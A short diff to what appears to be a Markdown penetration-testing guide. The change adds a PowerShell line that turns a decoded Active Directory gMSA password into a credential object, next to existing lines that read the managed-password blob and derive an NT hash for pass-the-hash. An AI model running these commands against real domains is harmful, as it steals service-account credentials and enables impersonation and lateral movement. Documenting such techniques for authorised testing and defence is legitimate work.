@@ -57,6 +57,8 @@ $mp = $gmsa.'msDS-ManagedPassword'
 ConvertFrom-ADManagedPasswordBlob $mp
 # Build a NT-Hash for PTH
 (ConvertFrom-ADManagedPasswordBlob $mp).SecureCurrentPassword | ConvertTo-NTHash
+# Alterantive: build a Credential-Object with the Plain Password
+$cred = new-object system.management.automation.PSCredential "Domain\Target_Account",(ConvertFrom-ADManagedPasswordBlob $mp).SecureCurrentPassword
 ```
 
 The second one relies on [GMSAPasswordReader](https://github.com/rvazarkar/GMSAPasswordReader) (C#).
